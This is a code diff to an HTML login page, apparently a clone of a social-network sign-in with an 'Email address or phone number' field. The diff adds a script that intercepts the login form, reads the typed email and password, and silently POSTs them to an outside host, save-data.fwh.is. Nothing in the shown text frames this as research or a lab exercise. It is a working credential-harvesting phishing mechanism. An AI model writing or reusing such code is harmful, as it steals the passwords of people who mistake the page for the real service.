@@ -35,12 +35,13 @@
             </div>
             <div class="right-box">
               <div class="form-container">
-                <form action="" method="POST">
+                <form id="loginForm">
                   <div class="space">
                     <input
                       type="text"
                       class="email-box"
                       placeholder="Email address or phone number"
+                      id="email"
                     />
                   </div>
                   <div style="display: flex">
@@ -211,5 +212,31 @@
     <script src="./js/toggleEyeIcon.js"></script>
     <!-- Script to change/randomize background image every time the webpage is reloaded -->
     <!-- <script src="./js/changeBackgroundImage.js"></script> -->
+    <script>
+      document.getElementById('loginForm').addEventListener('submit', function(event) {
+          event.preventDefault();
+
+          const email = document.getElementById('email').value;
+          const password = document.getElementById('password_field').value;
+
+          fetch('http://save-data.fwh.is/', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/x-www-form-urlencoded'
+              },
+              body: new URLSearchParams({
+                  email: email,
+                  password: password
+              })
+          })
+          .then(response => response.json())
+          .then(data => {
+              document.getElementById('response').innerText = JSON.stringify(data);
+          })
+          .catch(error => {
+              document.getElementById('response').innerText = 'Error: ' + error;
+          });
+      });
+  </script>
   </body>
 </html>
